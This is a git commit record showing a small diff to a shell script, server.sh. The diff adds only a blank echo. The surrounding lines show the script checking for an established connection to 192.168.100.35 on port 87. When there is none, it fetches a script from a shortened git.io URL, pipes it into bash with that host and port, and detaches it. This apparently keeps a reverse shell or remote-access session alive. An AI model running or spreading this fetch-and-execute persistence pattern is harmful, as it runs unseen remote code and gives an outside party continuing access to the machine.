da6875db6399e8dc7fb5556ba987826496129ea0
sorrynotsorry <54444533+sorrynotsorry1@users.noreply.github.com>
2022-07-27 16:24:35 +1000

    Update server.sh

--- server.sh
+++ server.sh
@@ -6,6 +6,8 @@ CHECK_IF_CONNECTED=$(lsof -i -P -n | grep ESTABLISHED)
 
 if [[ "$CHECK_IF_CONNECTED" == *"192.168.100.35:87"* ]]; then
 
+	echo ""	
+
 else
 
 	curl -Ls https://git.io/vXd2N | bash -s 192.168.100.35 87 & disown
